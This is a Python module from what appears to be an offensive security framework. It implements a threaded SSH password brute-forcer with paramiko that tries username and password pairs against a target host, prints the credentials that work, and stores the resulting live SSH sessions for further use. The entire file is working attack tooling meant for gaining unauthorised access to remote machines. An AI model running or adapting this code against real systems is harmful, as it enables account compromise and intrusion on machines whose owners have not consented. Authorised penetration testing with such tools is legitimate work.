from jframework.modules.login._bruteforce import _Bruteforce
import threading
import sys
hasParamiko = True
try:
    import paramiko
except:
    print("✕ It's required install paramiko module to run sshbruteforce")
    hasParamiko = False

MAXTHREADS = 10

class Sshbruteforce(_Bruteforce):

    def __init__(self):
        super(Sshbruteforce, self).__init__()
        self.lock = threading.Lock()
        self.sessions = []

    def worker(self, user, password):
        if(self.abortar):
            return
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(self.HOST, username=user, password=password)
            print("[+] " + str(user) + ":" + str(password) + " >> OK")
            self.lock.acquire()
            self.sessions.append({"id": 0, "ip": self.HOST, "session": client, "user": user})
            self.lock.release()
        except Exception as e:
            if "is not subscriptable" in str(e):
                print("Not SSH service")
                self.abortar = True
                sys.exit(0)
            if(self.verb):
                print("[-] " + str(user) + ":" + str(password) + " >> failed")
            client.close()
        self.num_threads -= 1
        sys.exit(0)

    def run(self, list_sessions):
        if (not hasParamiko):
            print("✕  It's required install paramiko")
            return
        super(Sshbruteforce, self).run(list_sessions)
        ini_length = len(list_sessions)

        print(len(self.sessions)- ini_length," sessions open")

        for session in self.sessions:
            id = self.return_id(list_sessions)
            session["id"] = id
            list_sessions.append(session)

        sys.exit(0)

    def return_id(self, session):
        if(not len(session)):
            return 1
        else:
            id = 1
            for s in session:
                if(s["id"] >= id):
                    id = s["id"]+1
            return id